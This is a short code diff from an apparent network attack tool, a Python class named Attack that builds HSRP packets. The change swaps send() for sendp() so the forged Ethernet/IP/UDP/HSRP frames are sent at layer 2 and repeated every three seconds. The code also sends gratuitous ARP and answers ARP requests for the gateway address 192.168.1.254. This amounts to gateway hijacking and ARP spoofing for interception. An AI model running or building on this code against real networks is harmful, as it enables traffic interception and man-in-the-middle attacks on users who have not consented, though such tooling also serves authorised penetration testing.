@@ -34,9 +34,9 @@ class Attack:
         toSend = ether/ip/udp/hsrp
         if (self.verbose == 1):
             toSend.show()
-        send(toSend, iface=self.iface)
+        sendp(toSend, iface=self.iface)
         self.send_garp()
-        send(toSend, iface=self.iface, inter=3, loop=1)
+        sendp(toSend, iface=self.iface, inter=3, loop=1)
 
     def arp_responder(self,packet):
         if (packet[ARP].op == 1 and packet.pdst == "192.168.1.254"):
